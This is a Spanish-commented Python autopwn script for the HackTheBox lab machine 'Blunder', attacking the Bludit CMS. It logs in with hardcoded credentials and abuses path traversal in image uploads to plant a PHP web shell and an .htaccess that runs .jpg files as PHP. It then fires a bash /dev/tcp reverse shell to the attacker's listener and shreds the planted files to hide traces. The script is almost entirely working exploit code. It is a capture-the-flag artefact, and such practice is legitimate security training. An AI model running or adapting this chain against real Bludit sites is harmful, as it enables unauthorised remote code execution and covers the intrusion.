#Autopwn para la maquina Blunder de HackTheBox.
#by. lanzf

#!/usr/bin/env python3
# coding: utf-8

import requests, os, sys, time, threading, argparse
from pwn import *

url = "http://10.10.10.191"
user = "fergus"
password = "RolandDeschain"

def arguments():
    parse = argparse.ArgumentParser(description='Reverse Shell Machine Blunder HackTheBox')
    parse.add_argument('-lhost', dest='lhost', type=str, required=True, help='IP to generate reverse shell')
    parse.add_argument('-lport', dest='lport', type=int, required=True, help='PORT to generate reverse shell')
    return parse.parse_args()

def csrf_fergus(url, cookie_key):
    session = requests.Session()
    cookie = {"BLUDIT-KEY" : cookie_key}
    headers = {
        "Origin" : url,
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Upgrade-Insecure-Requests" : "1",
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
        "Connection" : "close",
        "Referer" : url + "/admin/",
        "Accept-Language" : "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding" : "gzip, deflate"
    }
    response = session.get(url + "/admin/dashboard", headers=headers, cookies=cookie)
    token_fergus = response.text.split('var tokenCSRF = "')[1].split('"')[0]
    return token_fergus

def upload_image(url, cookie_key, token_fergus, image_file):
    p2 = log.progress("Subida de archivos")
    p2.status("Subiendo imagen " + image_file)
    time.sleep(2)

    session = requests.Session()
    data_post = {
        'uuid' : "../../tmp",
        'tokenCSRF' : token_fergus 
    }
    data_file = [
        ('images[]',
            (image_file, "<?php $out=system($_GET['xmd']); echo $out; ?>", 'application/octet-stream'))]
    headers = {
        "Origin" : url,
        "Accept" : "*/*",
        "X-Requested-With" : "XMLHttpRequest",
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
        "Connection" : "close",
        "Referer" : url + "/admin/new-content",
        "Accept-Language" : "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding" : "gzip, deflate"
    }
    cookie = {'BLUDIT-KEY' : cookie_key}

    response = session.post(url + '/admin/ajax/upload-images', data=data_post, files=data_file, headers=headers, cookies=cookie, timeout=3)

    p2.success("Imagen subida correctamente")
    time.sleep(1)

def upload_htaccess(url, cookie_key, token_fergus):
    p2 = log.progress("Subida de archivos")
    p2.status("Subiendo .htaccess")
    time.sleep(2)

    session = requests.Session()
    data_post = {
        'uuid' : "../../tmp",
        'tokenCSRF' : token_fergus 
    }
    data_file = [
        ('images[]',
            ('.htaccess', "RewriteEngine off\r\nAddType application/x-httpd-php .jpg", 'application/octet-stream'))]
    headers = {
        "Origin" : url,
        "Accept" : "*/*",
        "X-Requested-With" : "XMLHttpRequest",
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
        "Connection" : "close",
        "Referer" : url + "/admin/new-content",
        "Accept-Language" : "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding" : "gzip, deflate"
    }
    cookie = {'BLUDIT-KEY' : cookie_key}

    response = session.post(url + '/admin/ajax/upload-images', data=data_post, files=data_file, headers=headers, cookies=cookie, timeout=3)

    p2.success(".htaccess subido correctamente")
    time.sleep(1)

def request_reverseshell(url, cookie_key, token_fergus, image_file, lhost, lport):
    p3 = log.progress("Reverse shell")
    p3.status("Estableciendo conexión mediante el puerto " + str(lport))
    time.sleep(2)

    session = requests.Session()
    headers = {
        "Origin" : url,
        "Accept" : "*/*",
        "X-Requested-With" : "XMLHttpRequest",
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
        "Connection" : "close",
        "Referer" : url + "/admin/new-content",
        "Accept-Language" : "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding" : "gzip, deflate"
    }
    cookie = {'BLUDIT-KEY' : cookie_key}
    reverse_shell = "bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F" + lhost + "%2F" + str(lport) + "%200%3E%261%27"

    try:
        # Acá se va a quedar por lo que al hacer la shell estamos haciendo la petición y se va a quedar hasta que la cancelemos, por eso el timeout de 3 y que vaya al except
        response = session.get(url + '/bl-content/tmp/' + image_file + '?xmd=' + reverse_shell, cookies=cookie, timeout=3)
    except requests.exceptions.ReadTimeout:
        p3.success("Acceso obtenido")
        time.sleep(1)

def login(url, user, password, lhost, lport):
    try:
        p1 = log.progress("Login page")
        p1.status("Accediendo al portal web con fergus")
        time.sleep(2)

        session = requests.Session()
        login_page = session.get(url + '/admin')
        cookie_key = login_page.headers['Set-Cookie'].split(";")[0].split("=")[1] 
        cookie = {'BLUDIT-KEY' : cookie_key}
        csrf_token = re.findall(r'name="tokenCSRF" value="(.*?)"', login_page.text)[0]
        headers = {
            "Origin" : url,
            "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Upgrade-Insecure-Requests" : "1",
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
            "Connection" : "close",
            "Referer" : url + "/admin/",
            "Accept-Language" : "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding" : "gzip, deflate",
            "Content-Type" : "application/x-www-form-urlencoded"
        }
        data_post = {
            'tokenCSRF' : csrf_token,
            'username' : user,
            'password' : password,
            'save' : ""
        }

        response = session.post(url + "/admin/dashboard", data=data_post, headers=headers, cookies=cookie, allow_redirects=False, timeout=3)

        p1.status("Obteniendo cookie de sesión")
        time.sleep(1)
        cookie_key = cookie_key
        token_fergus = csrf_fergus(url, cookie_key)

        p1.success("Ingreso correctamente")
        time.sleep(1)

        # Si cambias el nombre de la imagen, debes cambiarla tambien al final para que te borre toda traza
        image_file = "lllx.jpg"
        upload_image(url, cookie_key, token_fergus, image_file)
        upload_htaccess(url, cookie_key, token_fergus)
        request_reverseshell(url, cookie_key, token_fergus, image_file, lhost, lport)

    except requests.exceptions.ReadTimeout:
        p1.failure("Tiempo de petición agotado")

def mani():
    login(url, user, password, args.lhost, args.lport)

if __name__ == '__main__':
    try:
        args = arguments()
        threading.Thread(target=mani).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(args.lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        log.failure("No se ha obtenido la conexion")
        exit(1)
    else:
        log.success("Conexion establecida")
        time.sleep(2)

    shell.sendline("shred -zun 10 .htaccess")
    shell.sendline("shred -zun 10 lllx.jpg")
    shell.sendline("shred -zun thumbnails/lllx.jpg")
    shell.sendline("export TERM=xterm")
    shell.sendline("python -c 'import pty; pty.spawn(\"/bin/bash\")'")
    shell.sendline("clear")

    shell.interactive()
